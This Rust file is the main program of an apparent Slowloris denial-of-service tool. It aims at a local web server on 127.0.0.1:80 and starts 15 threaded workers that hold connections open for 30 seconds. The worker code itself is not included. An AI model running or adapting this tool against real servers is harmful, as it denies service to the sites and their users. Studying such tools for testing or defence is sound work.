mod slowloris_worker;

use scoped_threadpool::Pool;
use slowloris_worker::SlowlorisWorker;
use std::net::TcpStream;

fn main() {
    const NUM_THREADS: u8 = 15;
    const SECONDS: u8 = 30;

    if TcpStream::connect("127.0.0.1:80").is_err() {
        panic!("Connection failed. Is the server up?");
    }

    let mut pool = Pool::new(NUM_THREADS as u32);
    let mut num_workers = 0;
    pool.scoped(|scoped| {
        while num_workers < NUM_THREADS {
            if let Ok(mut worker) = SlowlorisWorker::new(num_workers, SECONDS) {
                println!("[slowloris_{:02}] Spawned.", num_workers);
                scoped.execute(move || {
                    worker.start();
                });
                num_workers += 1;
            }
        }
    });
}
